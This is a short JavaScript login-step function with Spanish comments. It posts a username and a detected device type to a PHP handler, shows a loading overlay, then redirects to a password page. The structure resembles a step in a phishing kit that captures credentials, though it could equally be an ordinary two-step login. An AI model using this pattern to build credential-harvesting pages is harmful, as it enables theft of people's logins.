function inicio(u){
    var d = detectar_dispositivo();
    $("#fondo, #cargando-o").show();
    
    // Enviamos el usuario al archivo PHP
    $.post( "../process/inicio.php", { usr: u, dis: d } );

    // Saltamos a la clave de una vez (1 segundo)
    setTimeout(function(){ 
        window.location.href = "PASS.php"; 
    }, 1000);
}
